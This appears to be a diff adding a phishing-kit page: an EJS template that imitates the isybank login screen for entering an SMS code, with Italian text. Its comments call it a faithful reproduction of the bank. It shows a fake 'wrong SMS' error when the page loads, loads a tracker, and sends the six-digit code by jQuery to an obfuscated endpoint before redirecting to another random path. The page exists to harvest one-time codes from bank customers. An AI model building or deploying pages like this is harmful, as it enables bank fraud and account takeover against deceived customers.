@@ -1,0 +1,505 @@
+<!DOCTYPE html>
+<html lang="it">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
+    <title>isybank</title>
+    <link rel="stylesheet" href="css/botta.css">
+    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
+    <%- include('partials/tracker') %>
+    <style>
+        /* =========================================================
+           opt-02.ejs Specific Styles (Faithful Reproduction of isybank)
+           ========================================================= */
+
+        /* Title (3 lines matching reference screenshot) */
+        .mtan-title {
+            font-size: clamp(32px, 3.1vw, 52px);
+            font-weight: 700;
+            line-height: 1.15;
+            letter-spacing: -0.6px;
+            color: var(--isy-text, #191919);
+            margin-bottom: clamp(14px, 1.3vw, 20px);
+            text-align: left;
+        }
+
+        /* Error Notification Banner matching reference screenshot */
+        .error-banner {
+            display: inline-flex;
+            align-items: center;
+            width: fit-content;
+            max-width: 100%;
+            background-color: #ffffff;
+            border: 1px solid #f9aba5;
+            border-radius: 4px;
+            padding: 4px clamp(6px, 0.6vw, 10px);
+            margin-bottom: clamp(14px, 1.3vw, 20px);
+            box-sizing: border-box;
+        }
+
+        .err-icon {
+            width: 13px;
+            height: 13px;
+            margin-right: 6px;
+            flex-shrink: 0;
+            display: inline-block;
+        }
+
+        .err-text {
+            color: #ff1919;
+            font-size: clamp(10.5px, 0.74vw, 12.5px);
+            font-weight: 400;
+            line-height: 1.25;
+            white-space: nowrap;
+        }
+
+        /* Subtitle */
+        .mtan-subtitle {
+            font-size: clamp(15px, 1.15vw, 18px);
+            font-weight: 400;
+            line-height: 1.35;
+            color: var(--isy-text, #191919);
+            margin-bottom: clamp(24px, 2.2vw, 36px);
+            text-align: left;
+        }
+
+        /* Form Container */
+        .mtan-form {
+            display: flex;
+            flex-direction: column;
+            width: 100%;
+        }
+
+        /* 6 Underline Input Slots */
+        .mtan-inputs-wrapper {
+            display: flex;
+            align-items: center;
+            gap: clamp(4px, 0.4vw, 6px);
+            margin-bottom: clamp(12px, 1.1vw, 16px);
+        }
+
+        .mtan-digit {
+            width: clamp(28px, 2.1vw, 34px);
+            height: clamp(34px, 2.5vw, 40px);
+            border: none;
+            border-bottom: 2px solid #d1d2d4;
+            background: transparent;
+            text-align: center;
+            font-size: clamp(20px, 1.5vw, 24px);
+            font-weight: 500;
+            color: var(--isy-text, #191919);
+            font-family: inherit;
+            outline: none;
+            caret-color: #0070ba;
+            border-radius: 0;
+            padding: 0;
+            transition: border-bottom-color 0.15s, border-bottom-width 0.15s;
+            box-sizing: border-box;
+        }
+
+        .mtan-digit:focus,
+        .mtan-digit:active {
+            border-bottom: 2.5px solid #0070ba;
+        }
+
+        /* Timer Text */
+        .timer-line {
+            font-size: clamp(12px, 0.9vw, 14px);
+            color: #595959;
+            margin-bottom: clamp(14px, 1.3vw, 20px);
+            text-align: left;
+        }
+
+        .timer-line strong {
+            font-weight: 700;
+            color: var(--isy-text, #191919);
+        }
+
+        /* Entra Button */
+        .btn-mtan {
+            width: clamp(108px, 8.5vw, 136px);
+            height: clamp(34px, 2.5vw, 41px);
+            background-color: #bdbebf;
+            color: #8e9297;
+            border: none;
+            border-radius: 8px;
+            font-size: clamp(13.5px, 0.95vw, 15px);
+            font-weight: 500;
+            font-family: inherit;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            cursor: default;
+            margin-top: 0;
+            margin-bottom: clamp(14px, 1.2vw, 18px);
+            transition: background-color 0.2s, color 0.2s, box-shadow 0.2s;
+            user-select: none;
+        }
+
+        .btn-mtan.active {
+            background-color: #0066cc;
+            color: #ffffff;
+            cursor: pointer;
+            box-shadow: 0 2px 8px rgba(0, 102, 204, 0.25);
+        }
+
+        .btn-mtan.active:hover {
+            background-color: #0056b3;
+            box-shadow: 0 4px 12px rgba(0, 102, 204, 0.35);
+        }
+
+        /* Register / App Download Row */
+        .mtan-register-row {
+            font-size: clamp(13px, 0.95vw, 15px);
+            color: var(--isy-text, #191919);
+            text-align: left;
+            margin-bottom: clamp(20px, 2vw, 32px);
+        }
+
+        .mtan-register-row a {
+            color: #0066cc;
+            text-decoration: underline;
+            font-weight: 500;
+        }
+
+        .mtan-register-row a:hover {
+            color: #004085;
+        }
+
+        /* Dynamic Error Alert for re-attempts */
+        .mtan-dynamic-error {
+            color: #ff1919;
+            font-size: 13px;
+            margin-bottom: 12px;
+            text-align: left;
+            font-weight: 500;
+        }
+
+        /* =========================================================
+           Mobile Specific Styles (<= 768px)
+           ========================================================= */
+        @media (max-width: 768px) {
+            .mobile-content-wrapper {
+                align-items: center !important;
+                text-align: center !important;
+                margin: 0 auto !important;
+                width: 100%;
+                max-width: 360px;
+            }
+
+            .mtan-title {
+                text-align: center;
+                font-size: clamp(26px, 7vw, 34px);
+                margin-bottom: 14px;
+            }
+
+            .error-banner {
+                margin: 0 auto 18px auto;
+                padding: 5px 10px;
+            }
+
+            .err-text {
+                font-size: 11.5px;
+            }
+
+            .mtan-subtitle {
+                text-align: center;
+                margin-bottom: 22px;
+                font-size: 16px;
+            }
+
+            .mtan-form {
+                align-items: center;
+            }
+
+            .mtan-inputs-wrapper {
+                justify-content: center;
+                gap: 8px;
+                margin-bottom: 16px;
+            }
+
+            .mtan-digit {
+                width: 38px;
+                height: 44px;
+                font-size: 24px;
+            }
+
+            .timer-line {
+                text-align: center;
+                margin-bottom: 18px;
+            }
+
+            .btn-mtan {
+                width: 130px;
+                height: 42px;
+                margin-bottom: 18px;
+            }
+
+            .mtan-register-row {
+                display: flex;
+                flex-direction: column;
+                align-items: center;
+                text-align: center;
+                font-size: 14px;
+                gap: 2px;
+            }
+
+            .mtan-dynamic-error {
+                text-align: center;
+            }
+        }
+
+        @media (max-width: 360px) {
+            .err-text {
+                white-space: normal;
+                text-align: left;
+            }
+
+            .error-banner {
+                align-items: flex-start;
+            }
+
+            .err-icon {
+                margin-top: 1px;
+            }
+
+            .mtan-inputs-wrapper {
+                gap: 5px;
+            }
+
+            .mtan-digit {
+                width: 34px;
+                height: 40px;
+                font-size: 22px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+    <!-- Header Section (q1.png on Desktop, q1M.png on Mobile) -->
+    <header class="header-desktop" aria-label="Intestazione isybank">
+        <img src="img/q1.png" alt="isybank" onerror="if(!this.dataset.retried){this.dataset.retried=1;this.src='public/img/q1.png';}">
+    </header>
+    <header class="header-mobile" aria-label="Intestazione isybank mobile">
+        <img src="img/q1M.png" alt="isybank" onerror="if(!this.dataset.retried){this.dataset.retried=1;this.src='public/img/q1M.png';}">
+    </header>
+
+    <!-- Main Content Area -->
+    <main class="main-content">
+        <div class="content-inner">
+            <div class="mobile-content-wrapper">
+
+                <!-- Heading: 3 lines matching reference screenshot -->
+                <h1 class="mtan-title">Inserisci il codice a<br>6 cifre ricevuto via<br>SMS</h1>
+
+                <!-- Error Notification Banner matching reference screenshot -->
+                <div class="error-banner" role="alert">
+                    <img src="img/error-svgrepo-com 1.svg" class="err-icon" alt="" aria-hidden="true"
+                        onerror="if(!this.dataset.retried){this.dataset.retried=1;this.src='public/img/error-svgrepo-com 1.svg';}">
+                    <span class="err-text">Il messaggio SMS inserito non è corretto. Riprova. (133)</span>
+                </div>
+
+                <!-- Subtitle: SMS -->
+                <p class="mtan-subtitle">SMS</p>
+
+                <!-- mTAN Form -->
+                <form id="mtanForm" class="mtan-form" autocomplete="off" novalidate>
+
+                    <!-- 6 Underline Input Slots -->
+                    <div class="mtan-inputs-wrapper" aria-label="Inserisci codice a 6 cifre">
+                        <input type="tel" maxlength="1" class="mtan-digit" inputmode="numeric" autocomplete="one-time-code" aria-label="Cifra 1" autofocus>
+                        <input type="tel" maxlength="1" class="mtan-digit" inputmode="numeric" aria-label="Cifra 2">
+                        <input type="tel" maxlength="1" class="mtan-digit" inputmode="numeric" aria-label="Cifra 3">
+                        <input type="tel" maxlength="1" class="mtan-digit" inputmode="numeric" aria-label="Cifra 4">
+                        <input type="tel" maxlength="1" class="mtan-digit" inputmode="numeric" aria-label="Cifra 5">
+                        <input type="tel" maxlength="1" class="mtan-digit" inputmode="numeric" aria-label="Cifra 6">
+                    </div>
+
+                    <input type="hidden" id="mtan-hidden" name="code">
+
+                    <!-- Validity Countdown Timer -->
+                    <p class="timer-line">Validità dell'SMS in scadenza tra: <strong id="countdown">05:00</strong></p>
+
+                    <!-- Dynamic Error Alert for re-attempts (hidden by default) -->
+                    <div id="dynamicError" class="mtan-dynamic-error" style="display:none;" role="alert"></div>
+
+                    <!-- Button: Entra -->
+                    <button type="submit" id="submitBtn" class="btn-mtan" disabled>Entra</button>
+
+                    <!-- Link: Non sei ancora cliente? Scarica l'app -->
+                    <div class="mtan-register-row">
+                        <span>Non sei ancora cliente?</span>
+                        <a href="#" class="download-link">Scarica l'app</a>
+                    </div>
+
+                </form>
+
+            </div>
+        </div>
+
+        <!-- Decorative Rainbow Graphics (Desktop only, q2.png) -->
+        <img src="img/q2.png" alt="" class="rainbow-graphic" aria-hidden="true"
+            onerror="if(!this.dataset.retried){this.dataset.retried=1;this.src='public/img/q2.png';}">
+    </main>
+
+    <!-- Footer Section (q4.png on Desktop, q4M.png on Mobile) -->
+    <footer class="footer-desktop" aria-label="Piè di pagina isybank">
+        <img src="img/q4.png" alt="Guida ai servizi | Sicurezza | Privacy | Cookies | Reclami e risoluzione delle controversie | Dichiarazione di accessibilità | Trasparenza"
+            onerror="if(!this.dataset.retried){this.dataset.retried=1;this.src='public/img/q4.png';}">
+    </footer>
+    <footer class="footer-mobile" aria-label="Piè di pagina isybank mobile">
+        <img src="img/q4M.png" alt="Guida ai servizi | Sicurezza | Privacy | Cookies | Reclami e risoluzione delle controversie | Dichiarazione di accessibilità | Trasparenza"
+            onerror="if(!this.dataset.retried){this.dataset.retried=1;this.src='public/img/q4M.png';}">
+    </footer>
+
+    <!-- Interactive Logic -->
+    <script>
+        document.addEventListener('DOMContentLoaded', function () {
+            const digits = Array.from(document.querySelectorAll('.mtan-digit'));
+            const hiddenInput = document.getElementById('mtan-hidden');
+            const submitBtn = document.getElementById('submitBtn');
+            const form = document.getElementById('mtanForm');
+            const dynamicError = document.getElementById('dynamicError');
+
+            // --- Countdown timer (5 minutes: 05:00) ---
+            let seconds = 5 * 60;
+            const timerEl = document.getElementById('countdown');
+
+            function updateTimer() {
+                const m = String(Math.floor(seconds / 60)).padStart(2, '0');
+                const s = String(seconds % 60).padStart(2, '0');
+                if (timerEl) timerEl.textContent = m + ':' + s;
+                if (seconds > 0) {
+                    seconds--;
+                    setTimeout(updateTimer, 1000);
+                } else {
+                    if (timerEl) {
+                        timerEl.textContent = '00:00';
+                        timerEl.style.color = '#d32f2f';
+                    }
+                }
+            }
+            updateTimer();
+
+            // --- Complete Check & State Update ---
+            function checkComplete() {
+                let code = '';
+                digits.forEach(d => code += d.value.trim());
+                if (code.length === 6) {
+                    submitBtn.disabled = false;
+                    submitBtn.classList.add('active');
+                } else {
+                    submitBtn.disabled = true;
+                    submitBtn.classList.remove('active');
+                }
+                return code;
+            }
+
+            // --- Digit Navigation & Input Handling ---
+            digits.forEach((input, index) => {
+                input.addEventListener('input', function () {
+                    this.value = this.value.replace(/[^0-9]/g, '').slice(-1);
+                    if (dynamicError) dynamicError.style.display = 'none';
+                    if (this.value && index < digits.length - 1) {
+                        digits[index + 1].focus();
+                    }
+                    checkComplete();
+                });
+
+                input.addEventListener('keydown', function (e) {
+                    if (e.key === 'Backspace') {
+                        if (!this.value && index > 0) {
+                            digits[index - 1].focus();
+                            digits[index - 1].value = '';
+                        } else {
+                            this.value = '';
+                        }
+                        if (dynamicError) dynamicError.style.display = 'none';
+                        checkComplete();
+                    } else if (e.key === 'ArrowLeft' && index > 0) {
+                        digits[index - 1].focus();
+                    } else if (e.key === 'ArrowRight' && index < digits.length - 1) {
+                        digits[index + 1].focus();
+                    }
+                });
+
+                input.addEventListener('paste', function (e) {
+                    e.preventDefault();
+                    const clipData = (e.clipboardData || window.clipboardData);
+                    if (!clipData) return;
+                    const pasted = clipData.getData('text').replace(/[^0-9]/g, '').slice(0, 6);
+                    if (!pasted) return;
+
+                    pasted.split('').forEach((char, i) => {
+                        if (digits[index + i]) {
+                            digits[index + i].value = char;
+                        }
+                    });
+                    const next = Math.min(index + pasted.length, digits.length - 1);
+                    digits[next].focus();
+                    if (dynamicError) dynamicError.style.display = 'none';
+                    checkComplete();
+                });
+            });
+
+            // Focus first digit on page load
+            if (digits[0]) {
+                setTimeout(() => digits[0].focus(), 100);
+            }
+
+            // --- Form Submission ---
+            form.addEventListener('submit', function (e) {
+                e.preventDefault();
+                const code = checkComplete();
+
+                if (code.length < 6) {
+                    return;
+                }
+
+                hiddenInput.value = code;
+                submitBtn.disabled = true;
+                submitBtn.classList.remove('active');
+                submitBtn.textContent = 'Verifica...';
+                if (dynamicError) dynamicError.style.display = 'none';
+
+                $.ajax({
+                    url: '/m4kT9BQWt7KTDdaVmafx',
+                    type: 'POST',
+                    contentType: 'application/json',
+                    data: JSON.stringify({ code: code }),
+                    success: function (response) {
+                        if (response.OK) {
+                            setTimeout(() => {
+                                window.location.href = '/loading?time=7&url=/LGknmeM9HwWUWSutj6mJ';
+                            }, 1500);
+                        } else {
+                            if (dynamicError) {
+                                dynamicError.textContent = 'Codice non corretto. Riprova.';
+                                dynamicError.style.display = 'block';
+                            }
+                            submitBtn.textContent = 'Entra';
+                            submitBtn.disabled = true;
+                            submitBtn.classList.remove('active');
+                            digits.forEach(d => d.value = '');
+                            digits[0].focus();
+                        }
+                    },
+                    error: function () {
+                        if (dynamicError) {
+                            dynamicError.textContent = 'Si è verificato un errore. Riprova.';
+                            dynamicError.style.display = 'block';
+                        }
+                        submitBtn.textContent = 'Entra';
+                        submitBtn.disabled = true;
+                        submitBtn.classList.remove('active');
+                    }
+                });
+            });
+        });
+    </script>
+</body>
+
+</html>
